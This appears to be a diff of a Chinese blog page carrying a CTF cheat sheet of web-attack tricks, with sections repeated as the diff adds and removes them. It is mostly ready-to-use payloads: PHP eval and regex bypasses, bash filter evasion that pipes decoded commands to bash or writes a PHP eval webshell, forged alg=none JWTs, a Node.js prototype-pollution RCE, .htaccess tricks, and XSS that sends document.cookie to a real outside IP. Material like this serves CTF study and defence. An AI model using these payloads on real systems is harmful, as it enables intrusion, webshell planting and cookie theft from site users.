+<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">变量拼接</span><br><span class="line">a=l;b=s;<span class="variable">$a</span><span class="variable">$b</span></span><br><span class="line"><span class="variable">$@</span>绕过</span><br><span class="line">l<span class="variable">$@s</span></span><br><span class="line">单双引号绕过</span><br><span class="line"><span class="string">"l"</span>s</span><br><span class="line">反斜杠绕过</span><br><span class="line">l\s</span><br><span class="line">已有资源截取</span><br><span class="line">ls <span class="variable">$&#123;PATH:9:1&#125;</span><span class="variable">$&#123;PATH:11:1&#125;</span></span><br><span class="line">nl <span class="variable">$&#123;PATH:14:1&#125;</span><span class="variable">$&#123;PATH:21:1&#125;</span></span><br><span class="line"><span class="variable">$PS2</span>= &gt;</span><br><span class="line"><span class="variable">$ps4</span>= +</span><br><span class="line">编码绕过</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"命令base64编码"</span>|base64 -d|bash</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"hex编码"</span> | xxd -r -p|bash</span><br><span class="line">$(<span class="built_in">printf</span> <span class="string">"\154\163"</span>)八进制编码</span><br><span class="line">&#123;<span class="built_in">printf</span>,<span class="string">"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"</span>&#125; &gt;&gt; 1.php</span><br><span class="line">写shell</span><br><span class="line">过滤斜杠/ 可以使用 <span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure>
+
+<h2 id="jwt常见漏洞"><a href="#jwt常见漏洞" class="headerlink" title="jwt常见漏洞"></a>jwt常见漏洞</h2><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token</a></p>
+<p>JWT由三个部分构成：</p>
+<ul>
+<li>header:存放声明类型type(JWT)，加密算法alg(none,HS256等等)</li>
+<li>荷载：就是存放有效信息(标准中注册的声明，公共声明，私有声明)，一般用来存放需要传递的信息(用户名密码)。</li>
+<li>签名：将头部与荷载的信息base64加密并使用<code>.</code>连接，再通过header中的加密方式与secret组合加密。</li>
+</ul>
+<p>最终完整的JWT是由头部的base64<code>.</code>荷载的base64<code>.</code>与签名的组合。</p>
+<p>无加密算法JWT生成</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">'type'</span>:<span class="string">'jwt'</span>,</span><br><span class="line"><span class="string">'alg'</span>:<span class="string">"none"</span></span><br><span class="line">&#125;</span><br><span class="line">payload=&#123;</span><br><span class="line"><span class="string">'iat'</span>:<span class="number">1587378820</span>,</span><br><span class="line"><span class="string">'username'</span>:<span class="string">'admin'</span>,</span><br><span class="line"><span class="string">'password'</span>:<span class="string">'123'</span>,</span><br><span class="line"><span class="string">'secretid'</span>:[]</span><br><span class="line">&#125;</span><br><span class="line">he=json.dumps(headers)</span><br><span class="line">pa=json.dumps(payload)</span><br><span class="line">a=base64.b64encode(he.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">b=base64.b64encode(pa.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(a+<span class="string">'.'</span>+b+<span class="string">'.'</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="rs256-hs256"><a href="#rs256-hs256" class="headerlink" title="rs256-hs256"></a>rs256-hs256</h3><p>如果获取到公钥pk，可以使用HS-256算法用公钥对数据签名，py</p>
+<h2 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode"></a>json_decode</h2><p><img src="./image%5Cctf%E6%80%BB%E7%BB%93%5Cimage-20201010155236979.png" alt="image-20201010155236979"></p>
+<p>官方手册上说，json_encode支持utf-8编码的数据，那也就是支持unicode编码。</p>
+<h2 id="Ruby-ERB模板注入"><a href="#Ruby-ERB模板注入" class="headerlink" title="Ruby ERB模板注入"></a>Ruby ERB模板注入</h2><p>&lt;%= 7 * 7 %&gt;这种句法可以执行ruby语句</p>
+<h2 id="nodejs原型链污染"><a href="#nodejs原型链污染" class="headerlink" title="nodejs原型链污染"></a>nodejs原型链污染</h2><h3 id="kibana-RCE"><a href="#kibana-RCE" class="headerlink" title="kibana-RCE"></a>kibana-RCE</h3><p><a href="https://xz.aliyun.com/t/6755" target="_blank" rel="noopener">https://xz.aliyun.com/t/6755</a></p>
+<p>Nodejs在使用child_process建立子进程时，会将options对象的env属性作为环境变量加载到<code>/proc/self/environ</code>中，但是options对象默认为空，这就导致了只要污染Object.env，就能控制<code>/proc/self/environ</code>的值。</p>
+<p>当node版本&gt;v8.0.0以后支持运行node时增加一个命令行参数NODE_OPTIONS，它能够包含一个js脚本，相当于include，而NODE_OPTIONS是作为环境变量加载的，所以我们可以通过污染NODE_OPTIONS的值，来加载/proc/self/environ，执行我们之前污染的options.env的值。</p>
+<p>文章中的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// test.js</span><br><span class="line">proc = require(&apos;child_process&apos;);</span><br><span class="line">var aa = &#123;&#125;</span><br><span class="line">aa.__proto__.env = &#123;&apos;AAAA&apos;:&apos;console.log(process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /flag&apos;).toString())//&apos;,&apos;NODE_OPTIONS&apos;:&apos;--require /proc/self/environ&apos;&#125;  --require -r</span><br><span class="line">proc.fork(&apos;./function.js&apos;);</span><br><span class="line"></span><br><span class="line">//function.js</span><br><span class="line">console.log(&apos;this is func&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>利用条件：node&gt;v8.0，js使用child_process创建子进程。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;0&#125;&lt;&lt;&lt;\$\&apos;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$(())$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$(())$&#123;##&#125;$&#123;##&#125;$(())$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$(())$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$&#123;##&#125;$&#123;##&#125;$(())))\&apos;&lt;&lt;&lt;\$\&apos;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$(())$(())$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$(())$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$&#123;##&#125;$&#123;##&#125;$(())))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$(())))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$(())))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$&#123;##&#125;$(())$(())))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())$(())$(())))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$(())))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$&#123;##&#125;$(())$&#123;##&#125;$(())))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$(())))\&apos;</span><br></pre></td></tr></table></figure>
+
+<h3 id="XSS绕过姿势"><a href="#XSS绕过姿势" class="headerlink" title="XSS绕过姿势"></a>XSS绕过姿势</h3><p>小括号过滤了可以用反引号代替</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;setTimeout`alert\u0028document.cookie\u0029`;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;eval(&quot;window.location.href=&apos;http://8.129.69.85:2333&apos;&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;eval&amp;#40;&amp;#34;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#56;&amp;#46;&amp;#49;&amp;#50;&amp;#57;&amp;#46;&amp;#54;&amp;#57;&amp;#46;&amp;#56;&amp;#53;&amp;#58;&amp;#50;&amp;#51;&amp;#51;&amp;#51;&amp;#63;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#61;&amp;#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#34;&amp;#41;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://web.node3.buuoj.cn/post/35f5dcee21e6bcc461f6021ba07f8bba.html" target="_blank" rel="noopener">http://web.node3.buuoj.cn/post/35f5dcee21e6bcc461f6021ba07f8bba.html</a></p>
+<p><a href="http://web.node3.buuoj.cn/post/97b32351779495478f94dc5ff9537353.html" target="_blank" rel="noopener">http://web.node3.buuoj.cn/post/97b32351779495478f94dc5ff9537353.html</a></p>
+<h2 id="htaccess绕过姿势"><a href="#htaccess绕过姿势" class="headerlink" title="htaccess绕过姿势"></a>htaccess绕过姿势</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-ph\</span><br><span class="line">p .a</span><br><span class="line"></span><br><span class="line">php_value auto_append_file .htaccess    append or prepend</span><br><span class="line">#&lt;?php phpinfo();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># .htaccess</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line"> </span><br><span class="line"># index.php</span><br><span class="line">+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs</span><br><span class="line"></span><br><span class="line">可以转义换行符，从而达到多行注释</span><br><span class="line">#\</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/trick//" class="article-tag-list-link color1">trick</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/ctf总结/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-BUUCTF" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -894,168 +1187,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2019/09/10/BUUCTF/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ctf总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/09/10/ctf总结/">ctf</a>
-    </h1>
-  
-
-        
-        <a href="/2019/09/10/ctf总结/" class="archive-article-date">
-  	<time datetime="2019-09-09T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="md5常见绕过"><a href="#md5常见绕过" class="headerlink" title="md5常见绕过"></a>md5常见绕过</h2><h3 id="强比较绕过"><a href="#强比较绕过" class="headerlink" title="强比较绕过"></a>强比较绕过</h3><p>数组绕过</p>
-<p>​    md5碰到数组数据时返回null，null===nulll绕过。</p>
-<p>md5碰撞</p>
-<p>​    fastcoll</p>
-<h3 id="弱比较绕过"><a href="#弱比较绕过" class="headerlink" title="弱比较绕过"></a>弱比较绕过</h3><p>利用科学计数法0e+任何数字都为0。</p>
-<p>以下值在md5加密后以0E开头：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
-
-<p>以下值在sha1加密后以0E开头：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sha1(‘aaroZmOk’)</span><br><span class="line">sha1(‘aaK1STfY’)</span><br><span class="line">sha1(‘aaO8zKZF’)</span><br><span class="line">sha1(‘aa3OFF9m’)</span><br></pre></td></tr></table></figure>
-
-<p>以下值加密前后弱比较相等</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br></pre></td></tr></table></figure>
-
-<h2 id="eval命令执行"><a href="#eval命令执行" class="headerlink" title="eval命令执行"></a>eval命令执行</h2><h3 id="无数字字母"><a href="#无数字字母" class="headerlink" title="无数字字母"></a>无数字字母</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>payload php5-php7.0</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=$_=<span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span>;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=phpinfo()<span class="comment">//$_=_GET</span></span><br></pre></td></tr></table></figure>
-
-<p>如果把下划线也ban了，还能使用不可见字符或者+或者中文来做变量名。</p>
-<p>php7.0之后BAN了assert，不过可以用取反来调用函数。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();<span class="comment">//phpinfo();</span></span><br></pre></td></tr></table></figure>
-
-<p>值得一提的是eval 属于PHP语法构造的一部分，并不是一个函数，所以不能通过变量函数的形式来调用（虽然它确实像极了函数原型）。这样的语法构造还包括：echo，print，unset()，isset()，empty()，include，require。</p>
-<p>readfie(end(scandir(.)))</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure>
-
-<h2 id="preg-match绕过"><a href="#preg-match绕过" class="headerlink" title="preg_match绕过"></a>preg_match绕过</h2><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>当preg_match处理数组时会返回flase。</p>
-<h3 id="换行符"><a href="#换行符" class="headerlink" title="换行符"></a>换行符</h3><p>正则<code>.</code>不会匹配换行符</p>
-<p>在单行匹配下，<code>$</code>不会匹配\n或者\r。</p>
-<h3 id="PCRE回溯次数限制"><a href="#PCRE回溯次数限制" class="headerlink" title="PCRE回溯次数限制"></a>PCRE回溯次数限制</h3><p><a href="https://security.bytedance.com/index/" target="_blank" rel="noopener">https://security.bytedance.com/index/</a> </p>
-<p>PHP的PCRE采用NFA正则引擎</p>
-<p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态 </p>
-<p>NFA引擎会设置一个最大回溯次数，如果超过这个次数就返回FLASE,所以我们可发送超长字符串，使正则返回失败。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BytesIO(b&apos;aaa&lt;?php eval($_POST[txt]);//&apos; + b&apos;a&apos; * 1000000)</span><br></pre></td></tr></table></figure>
-
-<h2 id="Linux命令执行"><a href="#Linux命令执行" class="headerlink" title="Linux命令执行"></a>Linux命令执行</h2><p>参考文章<a href="https://blog.zeddyu.info/2019/01/17/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/01/17/</a> </p>
-<h3 id="常用通配符"><a href="#常用通配符" class="headerlink" title="常用通配符"></a>常用通配符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?匹配一个任意字符</span><br><span class="line">*匹配任意字符</span><br></pre></td></tr></table></figure>
-
-<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>$IFS分隔符</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;IFS&#125;</span>,<span class="variable">$IFS</span><span class="variable">$9</span></span><br></pre></td></tr></table></figure>
-
-<p>IFS表示linux下的分隔符，但是直接使用$IFS会导致歧义，比如cat$IFSfile，这样bash会将整个IFSfile当成变量名，导致无法读取到file文件，通常我们用${IFS}来确定变量名，或者使用$IFS$9,$9为当前系统shell进程的第九个参数，默认为空，在这里起到一个隔断作用。</p>
-<p>花括号扩展<code>{OS_COMMAND,ARGUMENT}</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,file&#125;</span><br></pre></td></tr></table></figure>
-
-<p>变量绕过</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="string">'cat\x20flag'</span>&amp;&amp;<span class="variable">$x</span></span><br><span class="line">x=<span class="string">'cat\x09flag'</span>&amp;&amp;<span class="variable">$x</span></span><br></pre></td></tr></table></figure>
-
-<p>\x20和\x09分别表示空格与tab。</p>
-<h3 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h3><p>linux中：<code>%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</code></p>
-<p>windows中：<code>%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</code></p>
-<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">变量拼接</span><br><span class="line">a=l;b=s;<span class="variable">$a</span><span class="variable">$b</span></span><br><span class="line"><span class="variable">$@</span>绕过</span><br><span class="line">l<span class="variable">$@s</span></span><br><span class="line">单双引号绕过</span><br><span class="line"><span class="string">"l"</span>s</span><br><span class="line">反斜杠绕过</span><br><span class="line">l\s</span><br><span class="line">已有资源截取</span><br><span class="line">ls <span class="variable">$&#123;PATH:9:1&#125;</span><span class="variable">$&#123;PATH:11:1&#125;</span></span><br><span class="line">nl <span class="variable">$&#123;PATH:14:1&#125;</span><span class="variable">$&#123;PATH:21:1&#125;</span></span><br><span class="line"><span class="variable">$PS2</span>= &gt;</span><br><span class="line"><span class="variable">$ps4</span>= +</span><br><span class="line">编码绕过</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"命令base64编码"</span>|base64 -d|bash</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"hex编码"</span> | xxd -r -p|bash</span><br><span class="line">$(<span class="built_in">printf</span> <span class="string">"\154\163"</span>)八进制编码</span><br><span class="line">&#123;<span class="built_in">printf</span>,<span class="string">"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"</span>&#125; &gt;&gt; 1.php</span><br><span class="line">写shell</span><br><span class="line">过滤斜杠/ 可以使用 <span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure>
-
-<h2 id="jwt常见漏洞"><a href="#jwt常见漏洞" class="headerlink" title="jwt常见漏洞"></a>jwt常见漏洞</h2><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token</a></p>
-<p>JWT由三个部分构成：</p>
-<ul>
-<li>header:存放声明类型type(JWT)，加密算法alg(none,HS256等等)</li>
-<li>荷载：就是存放有效信息(标准中注册的声明，公共声明，私有声明)，一般用来存放需要传递的信息(用户名密码)。</li>
-<li>签名：将头部与荷载的信息base64加密并使用<code>.</code>连接，再通过header中的加密方式与secret组合加密。</li>
-</ul>
-<p>最终完整的JWT是由头部的base64<code>.</code>荷载的base64<code>.</code>与签名的组合。</p>
-<p>无加密算法JWT生成</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">'type'</span>:<span class="string">'jwt'</span>,</span><br><span class="line"><span class="string">'alg'</span>:<span class="string">"none"</span></span><br><span class="line">&#125;</span><br><span class="line">payload=&#123;</span><br><span class="line"><span class="string">'iat'</span>:<span class="number">1587378820</span>,</span><br><span class="line"><span class="string">'username'</span>:<span class="string">'admin'</span>,</span><br><span class="line"><span class="string">'password'</span>:<span class="string">'123'</span>,</span><br><span class="line"><span class="string">'secretid'</span>:[]</span><br><span class="line">&#125;</span><br><span class="line">he=json.dumps(headers)</span><br><span class="line">pa=json.dumps(payload)</span><br><span class="line">a=base64.b64encode(he.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">b=base64.b64encode(pa.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(a+<span class="string">'.'</span>+b+<span class="string">'.'</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="rs256-hs256"><a href="#rs256-hs256" class="headerlink" title="rs256-hs256"></a>rs256-hs256</h3><p>如果获取到公钥pk，可以使用HS-256算法用公钥对数据签名，py</p>
-<h2 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode"></a>json_decode</h2><p><img src="G:%5CMyBlog%5Csource_posts%5Cimage%5Cctf%E6%80%BB%E7%BB%93%5Cimage-20201010155236979.png" alt="image-20201010155236979"></p>
-<p>官方手册上说，json_encode支持utf-8编码的数据，那也就是支持unicode编码。</p>
-<h2 id="Ruby-ERB模板注入"><a href="#Ruby-ERB模板注入" class="headerlink" title="Ruby ERB模板注入"></a>Ruby ERB模板注入</h2><p>&lt;%= 7 * 7 %&gt;这种句法可以执行ruby语句</p>
-<h2 id="nodejs原型链污染"><a href="#nodejs原型链污染" class="headerlink" title="nodejs原型链污染"></a>nodejs原型链污染</h2><h3 id="kibana-RCE"><a href="#kibana-RCE" class="headerlink" title="kibana-RCE"></a>kibana-RCE</h3><p><a href="https://xz.aliyun.com/t/6755" target="_blank" rel="noopener">https://xz.aliyun.com/t/6755</a></p>
